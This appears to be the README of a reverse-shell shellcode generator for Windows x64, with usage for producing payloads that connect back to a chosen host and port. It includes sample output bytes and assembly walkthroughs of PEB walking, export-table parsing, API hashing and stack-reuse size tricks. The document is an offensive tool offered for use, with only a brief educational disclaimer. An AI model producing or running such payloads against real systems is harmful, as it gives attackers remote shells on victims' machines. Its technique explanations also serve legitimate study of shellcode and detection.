# p0cket-shell

p0cket-shell is the most compact reverse shell shellcode available.
The intention of this shellcode was to explore the least amount of instructions in an executable to establish a reverse shell.
Although I do not think that the executable is objetively the smallest, it is miles smaller than what I originally researched.

**Disclaimer**: The purpose of this generated shellcode is for educational purposes and testing only.
Do not use this shellcode on machines you do not have permission to use.
Do not use this shellcode to leverage and communicate with machines that you do not have authorization to use.

<div align="center" markdown="1">
  <img width="500" src="assets/p0cket-shell.jpg">
  <br>
  <sup>Special thanks to Waffles</sup>
</div>

## Installation

```PowerShell
git clone https://github.com/SilenitsVox/p0cket-shell
cd p0cket-shell
python p0cket-shell.py
```

## Usage

Generating the shellcode is simply put.
There are 3 payloads: **Resolve**, **Hardcode**, and **Single**.
In the case of **Resolve**, when executed on WINDOWS X64 architecture, the payload will always succeed.
As for **Hardcode**, the function offsets are *hardcoded* within the shellcode. 
When executed on WINDOWS X64 architecture, the payload will always succeed with up-to-date machines.
And for **Single**, the payload will succeed if placed within an executable and an up-to-date machine. [2025-03-15]

The `--payload`, `--lhost`, `--lport` are all mandatory. The `--format`, `--output` parameters are not mandatory.

- `--payload`, you must use `resolve || hardcode || single` values.
- `--lhost`, you must use a valid ip `0.0.0.0`.
- `--lport`, you must use a valid port `0-65535`.
- `--format`, you may apply the values `asm || c || exe || powershell || python || raw`.
- `--output`, you may send the output to the given file path.

```PowerShell
> python3 p0cket-shell.py               \
--payload resolve                       \
--lhost 192.168.0.101                   \
--lport 4444                            \
--format ps1

[*] Payload size: 356 bytes
[*] Final size of PowerShell file: 2430 bytes
$Buffer = [Byte[]] @(
        0x65, 0x48, 0x8b, 0x04 ...
```

## How it works?

Reverse shell shellcode follows a unique, distinct execution flow.
The functions required are `CreateProcessA` (located in the `kernel32.dll` module), and `WSAStartup`, `WSASocketA`, and `connect` (located in the `ws2_32.dll` module).

Most shellcodes will perfom a PEB walk to retrieve handles to `kernel32.dll` or `ws2_32.dll`.
You can also receive a handle to these modules with the `LoadLibraryA` function.

A standard PEB walk utilizes the segment register and multiple pointer reads to retrieve the desired base address to a loaded module.
The structure to the PEB remains unchanging which is why it is the most reliable way of retrieving a module handle.
A PEB walk may go as follows.

```Asmx86
GET_KERNEL32:
        MOV     RAX,    GS:[0x60]       ; Segment Register      + 0x60  => pPEB
        MOV     RAX,    [RAX + 0x18]    ; pPEB                  + 0x18  => pLoaderData
        MOV     RAX,    [RAX + 0x30]    ; pLoaderData           + 0x30  => pInLoadOrderModuleList
        MOV     RAX,    [RAX]           ; pInLoaderOrderModuleList      => Flink
        MOV     RAX,    [RAX]           ; Flink                         => Flink
        MOV     RAX,    [RAX + 0x10]    ; Flink                 + 0x10  => pModule
```

Once a handle to a desired module is obtained, you may find the offset of a desired function.
When a module contains exported functions, information to each function is located within the data directory.
The key fields to these functions are: `NumberOfNames`, `NumberOfFunctions`, `AddressOfNames`, `AddressOfFunctions`, and `AddressOfNameOrdinals`.

- The fields `NumberOfNames` and `NumberOfFunctions` contain a 4 byte value. The value is the number of exported functions.
- The field `AddressOfNames` contains a 4 byte value. 
The value is the offset within the module to the names of each function.
Each name is null terminated, so the natural delimeter is a 0.
- The field `AddressOfFunctions` contains a 4 byte value.
The value is the offset within the module to the offsets of each function within the dll.
Each function offset is 4 bytes.
- The field `AddressOfNameOrdinals` contains a 4 byte value.
The value is the offset within the module to the slot number of each function.
Each slot number is 2 bytes.

#### Resolve

When resolving a function address, you must have any value that pertains to that function.
The most size-efficient function identifier is a hardcoded, 4 byte hash to a function.
Note: the hash algorithm must be as basic as possible for this to be size efficient.
By loading each function name, hashing them, and comparing to a known hash, we can obtain each function address.

###### Example Hashing Algorithm

```Asmx86
HASH:
        LODSB                   ; Load character into RAX
        ROR     R11D,   0x07    ; Rotate hash 7 bits
        ADD     R11D,   EAX     ; Add character to hash
```

###### Example Function Parsing

```Asmx86
PARSE_MODULE:
        MOV     R8D,    [RCX + 0x3c]                    ; Module Base Address + 0x3c                     => Pe Header Offset
        LEA     R8,     [RCX + R8]                      ; Module Base Address + Pe Header Offset         => Pe Header
        MOV     R8D,    [R8  + 0x88]                    ; Pe Header           + 0x88                     => Export Directory Offset
        LEA     R8,     [RCX + R8]                      ; Module Base Address + Export Directory Offset  => Export Directory
        MOV     R9D,    [R8  + 0x18]                    ; Export Directory    + 0x18                     => NumberOfNames
        MOV     R10D,   [R8  + 0x20]                    ; Export Directory    + 0x20                     => AddressOfNames Offset
        LEA     R10,    [RCX + R10]                     ; Module Base Address + AddressOfNames Offset    => AddressOfNames

SEARCH:
        DEC     R9                                      ; NumberOfNames       - 0x01                            => Next Index
        MOV     ESI,    [R10 + R9  * 0x04]              ; AddressOfNames      + (NumberOfNames * Address Size)  => Next Function Name Offset
        LEA     RSI,    [RCX + RSI]                     ; Module Base Address + Next Function Name Offset       => Next Function Name

RETURN_FUNCTION:
        MOV     EAX,    [R8  + 0x24]                    ; Base Address      + Pe Header Offset         => Pe Header Value
        LEA     RAX,    [RCX + RAX]                     ; Base Address      + Pe Header Value          => Pe Header Address
        MOVZX   EDX,    WORD [RAX + R9  * 0x02]         ; Pe Header Address + Export Directory Offset  => Export Directory Value
        MOV     EAX,    [R8  + 0x1c]                    ; Pe Header Address + Export Directory Value   => Export Directory Address
        LEA     RAX,    [RCX + RAX]                     ; Export Directory Address + NumberOfNames Offset   => dwNumberOfNames
        MOV     EAX,    [RAX + RDX * 0x04]              ; Export Directory Address + AddressOfNames Offset  => pAddressOfNames
        LEA     RAX,    [RCX + RAX]                     ; Base Address             + pAdddressOfNames       => lpAddressOfNames
        RET
```

#### Hardcode

When a machine is up-to-date, the function offsets within a module are unchanging.
That means if the offset to each functions can be calculated; The offsets may be hardcoded within the shellcode.
This also means that this method of function calling is unreliable.

###### Example Hardcode Function

```Asmx86
GET_WINEXEC:
;       CALL    GET_KERNEL32
;       MOV     RCX,    0x000707d0      ; WinExec Offset
        LEA     RDX,    [RAX + RCX]
```

## How is this the smallest?

The No. 1 difference between p0cket-shell, and other available shellcodes is calling conventions.
Windows follows the same protocol when a function is called; The protocol is call **Windows ABI** or **standard call**.
The first parameter to a function is placed in RCX.
The second parameter is placed in RDX, the next R8, the next R9.
Any following paramters are stored on the stack in reverse order.
Windows also requires 16 byte aligned stack with 32 bytes of zeroed overhead.

###### Example Windows Call

```Asmx86
CALL_WINDOWS_FUNCTION:
        MOV     RCX,    PARAMETER_1
        MOV     RDX,    PARAMETER_2
        MOV     R8,     PARAMETER_3
        MOV     R9,     PARAMETER_4
        PUSH    PARAMETER_5
        PUSH    PARAMETER_6
        SUB     RSP,    0x20
```

**What does this mean for the shellcode?**
WELL, some functions we use (LoadLibraryA, WSAStartup, connect), utilize the stack, but do not depend on it.
When we call these functions, they do not need the stack to return proper arguments.
They need 32 bytes of stack overhead, but do not need zeroes.

We can reuse stack space for other functions, `LoadLibraryA → WSAStartup`. 
We must push 0s for others, but reuse them later `WSASocketA → connect`.
We can also reuse registers that are predeicted.
The return register `RAX` may contain 0 indicating success, which means it does not have to be zeroed.